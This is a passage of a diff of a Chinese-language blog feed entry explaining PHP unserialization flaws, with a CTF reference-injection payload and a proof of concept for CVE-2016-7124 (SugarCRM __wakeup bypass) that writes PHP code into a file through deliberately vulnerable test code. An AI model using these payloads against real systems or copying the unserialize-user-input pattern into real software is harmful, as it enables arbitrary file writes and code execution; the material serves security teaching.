-由于引用参数，a和b引用的是同一个数据，因此a+1后，b也会变成2.
-</code></pre><p>CTF利用：</p>
-<pre><code>&lt;?php
-class just4fun {
-    var $enter;
-    var $secret;
-}
-
-if (isset($_GET[&apos;pass&apos;])) {
-    $pass = $_GET[&apos;pass&apos;];
-
-    if(get_magic_quotes_gpc()){//取得PHP环境变数magic_quotes_gpc的值，当magic_quotes_gpc打开时，所有的单引号，双引号，反斜线and空字符会自动转换为含有反斜线的溢出字符；
-        $pass=stripslashes($pass);//stripslashes()函数删除由addslashes()函数添加的反斜杠
-    }
-
-    $o = unserialize($pass);
-
-    if ($o) {
-        $o-&gt;secret = &quot;*&quot;;
-        if ($o-&gt;secret === $o-&gt;enter)
-            echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;
-        else
-            echo &quot;Oh no... You can&apos;t fool me&quot;;
-    }
-    else echo &quot;are you trolling?&quot;;
-}
-?&gt;
-</code></pre><p>我们构造访问<a href="http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}" target="_blank" rel="external">http://localhost/serializeTest.php?pass=O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</a><br>顺利输出Congratulation! Here is my secret: *</p>
-<h3 id="5-CVE-2016-7124反序列化漏洞"><a href="#5-CVE-2016-7124反序列化漏洞" class="headerlink" title="5 CVE-2016-7124反序列化漏洞"></a>5 CVE-2016-7124反序列化漏洞</h3><p>漏洞概述：</p>
-<p>SugarCRM（<a href="http://www.sugarcrm.com/" target="_blank" rel="external">http://www.sugarcrm.com/</a> ）是一套开源的客户关系管理系统。在其&lt;=6.5.23的版本中存在序列化漏洞，程序对攻击者恶意构造的序列化数据进行了反序列化的处理，从而使攻击者可以在未授权的情况下中兴任意的代码。</p>
-<pre><code>对于此漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行
-</code></pre><p>知识储备：</p>
-<ul>
-<li>unserialize()函数会检查勒种是否存在一个魔术方法<strong>wakeup方法，若存在会先调用</strong>wakeup方法，预先准备对象需要的资源</li>
-<li>__wakeup()方法经常用在反序列化的操作中，例如重新建立数据库的连接，或建立其它初始化操作</li>
-<li>get_object__var()函数返回由对象属性创建的关联数组。</li>
-</ul>
-<p>具体测试代码：</p>
-<pre><code>&lt;?php
-class A{
-    var $a = &quot;test&quot;;
-    function __destruct(){
-        $fp = fopen(&quot;D:\\phpStudy\\WWW\\hello.php&quot;,&quot;w&quot;);
-        fputs($fp,$this-&gt;a);
-        fclose($fp);
-    }
-
-    function __wakeup()
-        {    
-            foreach(get_object_vars($this) as $k =&gt; $v) {
-                    $this-&gt;$k = null;
-            }
-            echo &quot;Waking up...\n&quot;;
-        }
-}
-$test = $_POST[&apos;test&apos;];
-$test_unser = unserialize($test);
-?&gt;
-</code></pre><p>使用payload进行测试，结果如下：<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/50125046.jpg" alt=""><br>发现__wakeup函数成功执行，消除了对象属性，从而hello.php内容也没空。</p>
-<p>漏洞证明：</p>
-<p>我们将上面的test=O:1:”A”:1:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}中的A的个数变成2或者大于2的数字如下：</p>
-<pre><code>test=O:1:”A”:2:{s:1:”a”;s:18:”&lt;?php phpinfo();?&gt;”;}
-</code></pre><p>然后在执行就会发现绕过了__wakeup函数，成功将phpinfo()写入到hello.php<br><img src="http://7xrn7f.com1.z0.glb.clouddn.com/16-10-27/95172433.jpg" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h3 id=&quot;什么是序列化以及反序列化&quot;&gt;&lt;a href=&quot;#什么是序列化以及反序列化&quot; class=&quot;headerlink&quot; title=&quot;什么是序列化以及反序列化&quot;&gt;&lt;/a&gt;什么是序列化以及反序列化&lt;/h3&gt;&lt;p&gt;序列化是将PHP中的值（zval）转换成一段包含字节流的字符串。序列化一个对象会保存为对象中的所有变量的值，但不会保存对象的方法，以及只会保存类的名字。其本质就是将程序以相应的格式保存下来&lt;/p&gt;
-&lt;p&gt;反序列化：对单一的一序列化的变量进行操作，将其转换回PHP的值。&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="PHP" scheme="http://yoursite.com/tags/PHP/"/>
     
   </entry>
   
